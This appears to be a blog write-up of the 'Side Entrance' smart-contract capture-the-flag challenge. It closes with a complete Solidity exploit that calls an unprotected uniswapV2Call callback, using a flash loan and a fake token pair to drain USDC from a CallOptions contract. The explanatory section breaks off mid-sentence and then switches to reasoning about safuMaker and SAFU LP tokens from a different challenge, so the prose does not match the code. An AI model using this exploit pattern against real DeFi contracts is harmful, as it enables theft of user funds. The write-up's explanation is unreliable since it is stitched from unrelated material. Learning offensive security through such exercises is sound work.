---
title: "Mr Steal Yo Crypto — Side Entrance"
date: 2023-07-22
draft: false
description: "CTF - 14"
tags: ["CTF"]
series: ["CTF"]
series_order: 14
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #14 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Side Entrance

There’s a CallOptions contract which allows users to create covered wETH-USDC call options.

> They’ve even provided functionality that allows users to execute their purchased options without any capital by utilizing Uniswap flash loans.
> Your task is to steal at least 90k USDC. You start with no funds.

See the contracts:
- [Side Entrance Contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/side-entrance)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/14-side-entrance.sol)

## Review of the contract

### CallOPtions.sol

I’m writing this article after the challenge #17. I want to retry the reverse method. We will start from where USDC can be transferred to us and then go back to the origin.
Uhhhh, I don’t see where it is possible. The protocol sends USDC to the owner of the option when someone buys an option at [L145](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/side-entrance/CallOptions.sol#L145). He sends also USDC to the owner when the buyer wants to execute the option. For now, we have no possibilities.

## Exploit the vulnerability

The vulnerability is that anyone can call `uniswapV2Call()`. Inside the function, we _decode_ the data that will be used for <br> I took some time to exploit this contract, it was the first time that I was confronted with a “logical” vulnerability instead of a basic attack vector.

At the beginning, I checked if an attack vector that I know could be useful. However, I didn’t find anything except that with `_convert()` we are swapping all the balance of a token into SAFU.

So I started to open my mind, like
_Why the vulnerability would be only inside the protocol?_
As we can see in the test file, we are using uniswapV2, and the admin user is sending 1% of LP to the safuMaker contract. Maybe we could do something with this LP? At this moment an idea popped out of my mind. 
We know that the contract is swapping any token into SAFU token. Why not creating a pair LP(USDC-SAFU)-SAFU then:
1. Send some LP of the new pair to safuMaker
2. Call the `convert(address(LP(USDC-SAFU)), address(SAFU))` function so that safuMaker burns the LP(LP(USDC-SAFU)-SAFU) and then swaps LP(USDC-SAFU) to SAFU.
3. Then we can withdraw our liquidity and get more LP(USDC-SAFU) compared to the beginning.
4. Withdraw liquidity by burning LP(USDC-SAFU) and obtain more USDC and SAFU from the beginning.

To be sure that is possible, I checked the `_convert()` function. The idea seems possible because at [L97](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/src/free-lunch/SafuMakerV2.sol#L97). The safuMaker contract says that he wants to sell all the balance of the token. So in our case, he wants to sell all his balance of LP(USDC-SAFU). This is pretty cool because the contract already has a big amount of LP.

Here is my solution:
```solidity
contract Exploit {

    address owner;
    Token fakeToken;
    Token usdc;
    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair usdcFakeTokenPair;
    IUniswapV2Pair usdcDaiPair;
    CallOptions optionsContract;

    constructor(address attacker, address _optionsContract, address _factory, address _router, address _usdc, address _usdcDaiPair) {
        owner = attacker;
        optionsContract = CallOptions(_optionsContract);
        fakeToken = new Token('DAI ', 'DAI ');
        fakeToken.mint(address(this), 1_000_000e18);
        uniRouter = IUniswapV2Router02(_router);
        uniFactory = IUniswapV2Factory(_factory);
        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);
        usdc = Token(_usdc);
        usdc.approve(address(uniRouter), type(uint).max);
        fakeToken.approve(address(uniRouter), type(uint).max);
    }

    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {
        console.log("balance usdc of exploit : ", usdc.balanceOf(address(this)));
        uniRouter.addLiquidity(address(usdc), address(fakeToken), usdc.balanceOf(address(this)), fakeToken.balanceOf(address(this)), 0, 0, address(this), block.timestamp);
        usdcFakeTokenPair = IUniswapV2Pair(uniFactory.getPair(address(usdc), address(fakeToken)));

        address to = abi.decode(data, (address));
        bytes32 optionId = optionsContract.getLatestOptionId();
        uint256 interestAmount = usdc.balanceOf(address(to));

        bytes memory _calldata = abi.encode(optionId, to, interestAmount);
        usdcFakeTokenPair.swap(2_100e18, 0, address(optionsContract), _calldata);

        console.log("balance usdc of target : ", usdc.balanceOf(address(owner)));
        console.log("balance usdc of usdcFakeTokenPair : ", usdc.balanceOf(address(usdcFakeTokenPair)));
        usdcFakeTokenPair.approve(address(uniRouter), type(uint).max);
        uniRouter.removeLiquidity(address(usdc), address(fakeToken), usdcFakeTokenPair.balanceOf(address(this))-1, 0, 0, address(this), block.timestamp);

        console.log("balance usdc of exploit : ", usdc.balanceOf(address(this)));
        console.log("amount to repay : ", (amount0Out * 103 / 100) + 1); // yeah the premium is a bit too high

        usdc.transfer(address(usdcDaiPair), (amount0Out * 103 / 100) + 1);
        usdc.transfer(owner, usdc.balanceOf(address(this)));
        console.log("balance usdc of attacker : ", usdc.balanceOf(address(owner)));
    }

    function pwn(address target) external {
        bytes memory _calldata = abi.encode(target);
        usdcDaiPair.swap(3_000e18, 0, address(this), _calldata);
    }
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/14-side-entrance.sol).

I would not have been able to pass the challenge without the hint.
This challenge reminds me how it is essential to decide who is able to call a function.

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.